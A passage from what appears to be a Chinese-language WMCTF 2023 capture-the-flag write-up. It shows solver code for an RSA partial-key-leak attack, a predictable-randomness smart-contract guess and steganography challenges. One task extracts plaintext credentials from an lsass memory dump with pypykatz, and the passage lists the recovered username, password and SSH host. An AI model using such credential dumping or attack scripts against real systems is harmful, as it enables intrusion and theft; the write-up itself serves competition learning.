</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>n</span><span class=o>=</span><span class=mi>20825489698123139427312358235813908831188122629431837435213939197307901251678987909266109959310844471468714237308180487290333889068491106503430156516177566599988193609000565728122172493368572776286199729640176084529179529033159071165889815084949956152007234471933649343743634072356673587613258974082953565848240177717357720918379799092214471736935314356967352460495832597042553425146329955254971272296130376832214081900624023878189763660242551943370962708281677737787426223857022204965043738543727228525935167205033424509100484602367650848918269719924270083733713912562266880394295051276242510789648948740514338324777</span>
</span></span><span class=line><span class=cl><span class=n>c</span><span class=o>=</span><span class=mi>17660292517001448415667382933294147092092405515035599241974878300112871854442062464511060994610735354900137641722708614729686565533897576482184144279181475147778387677176348272271380462469442504169069741393441249336244403644195456048895432327953609790997136317418079743539554372864800226725666330693057526593982562626092666413078781481473963123259351557468951203872280649962451021987453492400869965374621346616866098360220974826366437663499045468100705032192923936739527164839478419438533067729191594895444595242468993294280095495595676751833319662172716427810323452481625334318690581815970642174149961644882435761028</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=o>=</span><span class=mi>3692928803159612385082176945507830185837247431720458675036856767821980549084041505438940558901970003265562780917014304168473747961208711410251658081541741851950617445754508576247765571585451448623373615544180432133708851940192670177786710978705748899533781421711820301844113328851132313516583</span>
</span></span><span class=line><span class=cl><span class=n>M</span><span class=o>=</span><span class=mh>0x7cda79f57f60a9b65478052f383ad7dadb714b4f4ac069997c7ff23d34d075fca08fdf20f95fbc5f0a981d65c3a3ee7ff74d769da52e948d6b0270dd736ef61fa99a54f80fb22091b055885dc22b9f17562778dfb2aeac87f51de339f71731d207c0af3244d35129feba028a48402247f4ba1d2b6d0755baff6</span>
</span></span><span class=line><span class=cl><span class=n>PR</span><span class=o>.&lt;</span><span class=n>x</span><span class=o>&gt;</span> <span class=o>=</span> <span class=n>PolynomialRing</span><span class=p>(</span><span class=n>Zmod</span><span class=p>(</span><span class=n>n</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>=</span><span class=n>x</span><span class=o>*</span><span class=n>M</span><span class=o>+</span><span class=n>leak</span>
</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>.</span><span class=n>monic</span><span class=p>()</span><span class=o>.</span><span class=n>small_roots</span><span class=p>(</span><span class=n>X</span><span class=o>=</span><span class=mi>2</span><span class=o>^</span><span class=mi>53</span><span class=p>,</span><span class=n>beta</span><span class=o>=</span><span class=mf>0.44</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=mi>6960192004016795</span><span class=o>*</span><span class=n>M</span><span class=o>+</span><span class=n>leak</span>
</span></span><span class=line><span class=cl><span class=n>q</span><span class=o>=</span><span class=n>n</span><span class=o>//</span><span class=n>p</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=n>p</span><span class=o>*</span><span class=n>q</span><span class=o>==</span><span class=n>n</span>
</span></span><span class=line><span class=cl><span class=n>d</span><span class=o>=</span><span class=n>inverse</span><span class=p>(</span><span class=mi>65537</span><span class=p>,(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=n>q</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>ZZ</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=n>c</span><span class=p>,</span><span class=n>d</span><span class=p>,</span><span class=n>n</span><span class=p>)))</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=misc>Misc</h1><h2 id=oversharing>Oversharing</h2><p>pcap data 发现 smb sharing 的 lsass.dmp 文件</p><p>pypykatz 分析后得到明文密码和用户名</p><p>1a05cf83-e450-4fbf-a2a8-b9fd2bd37d4e</p><p>randark</p><p>ssh <a href=mailto:randark@1.13.101.243>randark@1.13.101.243</a> -p25771</p><p>链接上去后直接 cat flag 即可</p><h2 id=findme>FindMe</h2><p>我的朋友WearyMeadow几天前在Reddit发了一条动态，他认为没有人能破解他的消息，真的吗？ My friend WearyMeadow posted a Reddit post a few days ago and he doesn&rsquo;t think anyone can decrypt his message. Really?</p><p><a href=https://wearymeadow.icu/about/>https://wearymeadow.icu/about/</a></p><p>存在一个被加密的推文 根据生成时间判断相似 以及文章标题和 reddit 一致，密码是P@sSW0rD123$%^</p><p><a href=https://www.reddit.com/user/WearyMeadow/comments/15u7773/hello/>https://www.reddit.com/user/WearyMeadow/comments/15u7773/hello/</a> &ndash;> aHR0cHM6Ly91ZmlsZS5pby82NzB1bnN6cA== &ndash;></p><p><a href=https://ufile.io/670unszp>https://ufile.io/670unszp</a></p><p>解出来 message.pcap 文件 流量分析基本情况是 存在一个 tcp 聊天 并且 secretkey 是 mysecretkey (?)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.Padding</span> <span class=kn>import</span> <span class=n>pad</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>message</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>seed</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>random</span><span class=o>.</span><span class=n>seed</span><span class=p>(</span><span class=n>seed</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypted_msg</span> <span class=o>=</span> <span class=n>message</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypted_msg</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>pad</span><span class=p>(</span><span class=n>encrypted_msg</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypted</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>decrypted_msg</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>decrypted</span> <span class=o>+=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>decrypted_msg</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>255</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>decrypted</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>encrypted_hex</span> <span class=o>=</span> <span class=s2>&#34;778f6cc13090c6a4f0b51939d784a6b38512f80a92b82bf8225fb8bfed713b2f8eee53dfbe228c7296449d904467a1677c83b9534e2dfcfcbc6f7b08f77f96f2&#34;</span>
</span></span><span class=line><span class=cl><span class=n>encrypted</span> <span class=o>=</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>encrypted_hex</span><span class=p>,</span> <span class=mi>16</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>encrypted</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>seed</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>12345</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypted_int</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>decrypt</span><span class=p>(</span><span class=n>encrypted</span><span class=p>,</span> <span class=n>pad</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;mysecretkey&#34;</span><span class=p>),</span> <span class=n>seed</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;CTF{&#39;</span> <span class=ow>in</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>decrypted_int</span><span class=p>)</span> <span class=ow>or</span> <span class=sa>b</span><span class=s1>&#39;ctf{&#39;</span> <span class=ow>in</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>decrypted_int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>seed</span><span class=p>,</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>decrypted_int</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=fantastic_terminal>Fantastic_terminal</h2><p><img src=/img/2023-08-19Wmctf/20230821210707921.jpg alt=img></p><h1 id=blockchain>Blockchain</h1><h2 id=babyblock>babyblock</h2><p>签到题，根据合约creation交易找到timestamp即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-TypeScript data-lang=TypeScript><span class=line><span class=cl><span class=kr>import</span> <span class=p>{</span> <span class=nx>ethers</span> <span class=p>}</span> <span class=kr>from</span> <span class=s2>&#34;hardhat&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=p>{</span> <span class=nx>ChallengeWM23__factory</span><span class=p>,</span> <span class=nx>ChallengeWM23</span> <span class=p>}</span> <span class=kr>from</span> <span class=s2>&#34;../../typechain&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=p>{</span> <span class=nx>log</span><span class=p>,</span> <span class=nx>initialize</span> <span class=p>}</span> <span class=kr>from</span> <span class=s2>&#34;../utils&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>main() {</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>tx</span> <span class=o>=</span> <span class=s2>&#34;0xcb2d1f40783046b623e39312267ad91ecf40ee338fb1631c2526c96af7f7e3b2&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>contractAddress</span> <span class=o>=</span> <span class=s2>&#34;0xCe8B517e34f7b5C95Dfc16931fC0eC5E41796327&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=p>[</span><span class=nx>challengeContract</span><span class=p>,</span> <span class=nx>attacker</span><span class=p>]</span> <span class=o>=</span> <span class=k>await</span> <span class=nx>initialize</span><span class=p>&lt;</span><span class=nt>ChallengeWM23</span><span class=p>&gt;(</span><span class=nx>ChallengeWM23__factory</span><span class=p>,</span> <span class=kc>undefined</span><span class=p>,</span> <span class=kc>undefined</span><span class=p>,</span> <span class=kc>undefined</span><span class=p>,</span> <span class=nx>contractAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>blockHash</span> <span class=o>=</span> <span class=p>(</span><span class=k>await</span> <span class=nx>ethers</span><span class=p>.</span><span class=nx>provider</span><span class=p>.</span><span class=nx>getTransaction</span><span class=p>(</span><span class=nx>tx</span><span class=p>))</span><span class=o>?</span><span class=p>.</span><span class=nx>blockHash</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>blockHash</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>block</span> <span class=o>=</span> <span class=k>await</span> <span class=nx>ethers</span><span class=p>.</span><span class=nx>provider</span><span class=p>.</span><span class=nx>getBlock</span><span class=p>(</span><span class=nx>blockHash</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>timestamp</span> <span class=o>=</span> <span class=nx>block</span><span class=o>?</span><span class=p>.</span><span class=nx>timestamp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>timestamp</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=kt>number</span> <span class=o>=</span> <span class=nx>timestamp</span> <span class=o>%</span> <span class=mi>10</span> <span class=o>+</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>tx</span> <span class=o>=</span> <span class=k>await</span> <span class=nx>challengeContract</span><span class=p>.</span><span class=nx>guessNumber</span><span class=p>(</span><span class=kt>number</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>await</span> <span class=nx>tx</span><span class=p>.</span><span class=nx>wait</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=sb>`Is Solved: </span><span class=si>${</span><span class=k>await</span> <span class=nx>challengeContract</span><span class=p>.</span><span class=nx>isSolved</span><span class=p>()</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>main</span><span class=p>().</span><span class=k>catch</span><span class=p>((</span><span class=nx>error</span><span class=p>)</span> <span class=o>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=nx>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>process</span><span class=p>.</span><span class=nx>exitCode</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=steg>Steg</h1><h2 id=ez_v1deo>EZ_v1deo</h2><p>使用windows的播放器没办法播放，可以使用其他播放器进行播放即可正常查看视频</p><p><img src=/img/2023-08-19Wmctf/20230821210711167.jpg alt=img></p><p>这里查看并无异常，然后尝试AVI隐写</p><p><img src=/img/2023-08-19Wmctf/20230821210711091.jpg alt=img></p><p>avi隐写可以讲信息隐藏在某一帧的图片中，使用ffmpeg转换出每一帧进行查看lsb</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>ffmpeg</span> <span class=o>-</span><span class=n>i</span> <span class=n>E</span><span class=p>:</span>\<span class=n>BaiduNetdiskDownload</span>\<span class=mi>1</span>\<span class=n>flag</span><span class=o>.</span><span class=n>avi</span> <span class=o>-</span><span class=n>r</span> <span class=mi>30</span> <span class=n>C</span><span class=p>:</span>\<span class=n>Users</span>\<span class=n>Ap_os</span>\<span class=n>Desktop</span>\<span class=mi>2</span><span class=o>-</span><span class=mi>4</span>\<span class=n>image</span><span class=o>-%</span><span class=mi>3</span><span class=n>d</span><span class=o>.</span><span class=n>png</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2023-08-19Wmctf/20230821210711409.jpg alt=img></p><p><img src=/img/2023-08-19Wmctf/20230821210711397.jpg alt=img></p><p>隐写查看</p><p><img src=/img/2023-08-19Wmctf/20230821210711450.jpg alt=img></p><p>得到w, 应该是WMCTF{},然后将每一帧都进行查看即可</p><p>得到字符串进行剔除重复的，然后使用比较多的相同字符即为flag中重复的字符，比如下面的9</p><p><img src=/img/2023-08-19Wmctf/20230821210711499.jpg alt=img></p><h2 id=steglab1>StegLab1</h2><p>加密脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Solution</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>Encrypt</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>img_path</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>key</span> <span class=o>=</span> <span class=s2>&#34;1111&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>img_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>img_array</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>key_values</span> <span class=o>=</span> <span class=p>[</span><span class=nb>ord</span><span class=p>(</span><span class=n>char</span><span class=p>)</span> <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>key</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>max_key_length</span> <span class=o>=</span> <span class=nb>min</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>key_values</span><span class=p>),</span> <span class=n>img_array</span><span class=o>.</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>flat_img_array</span> <span class=o>=</span> <span class=n>img_array</span><span class=o>.</span><span class=n>flatten</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>max_key_length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>flat_img_array</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^=</span> <span class=n>key_values</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>encrypted_img_array</span> <span class=o>=</span> <span class=n>flat_img_array</span><span class=o>.</span><span class=n>reshape</span><span class=p>(</span><span class=n>img_array</span><span class=o>.</span><span class=n>shape</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>encrypted_img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>fromarray</span><span class=p>(</span><span class=n>encrypted_img_array</span><span class=o>.</span><span class=n>astype</span><span class=p>(</span><span class=n>np</span><span class=o>.</span><span class=n>uint8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>encrypted_img</span>
</span></span></code></pre></td></tr></table></div></div><p>写解密脚本跑出来这个加密的key，系统可以检测得应该就可以点击flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>class</span> <span class=nc>Solution</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>Encrypt</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>img</span><span class=p>,</span> <span class=n>key</span><span class=p>)</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>img_array</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>key_bin</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>format</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>char</span><span class=p>),</span> <span class=s1>&#39;08b&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>key</span><span class=p>)</span>  <span class=c1># Convert key to binary</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>key_index</span> <span class=o>=</span> <span class=mi>0</span>  <span class=c1># Track the index of the key bit we&#39;re currently hiding</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>img_array</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>0</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>img_array</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>1</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>img_array</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>2</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>key_index</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>key_bin</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                        <span class=n>pixel_value</span> <span class=o>=</span> <span class=n>img_array</span><span class=p>[</span><span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>,</span> <span class=n>k</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                        <span class=n>new_pixel_value</span> <span class=o>=</span> <span class=n>pixel_value</span> <span class=o>&amp;</span> <span class=mh>0xFE</span> <span class=o>|</span> <span class=nb>int</span><span class=p>(</span><span class=n>key_bin</span><span class=p>[</span><span class=n>key_index</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                        <span class=n>img_array</span><span class=p>[</span><span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>,</span> <span class=n>k</span><span class=p>]</span> <span class=o>=</span> <span class=n>new_pixel_value</span>
</span></span><span class=line><span class=cl>                        <span class=n>key_index</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>encrypted_img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>fromarray</span><span class=p>(</span><span class=n>img_array</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>encrypted_img</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Solution</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>Decrypt</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span><span class=n>img</span><span class=p>)</span><span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>img_array</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>key_bin</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>key_length</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>img_array</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>0</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>img_array</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>1</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>img_array</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>2</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>                    <span class=n>pixel_value</span> <span class=o>=</span> <span class=n>img_array</span><span class=p>[</span><span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>,</span> <span class=n>k</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                    <span class=n>key_bit</span> <span class=o>=</span> <span class=n>pixel_value</span> <span class=o>&amp;</span> <span class=mh>0x01</span>
</span></span><span class=line><span class=cl>                    <span class=n>key_bin</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>key_bit</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>key_length</span> <span class=o>+=</span> <span class=mi>1</span>
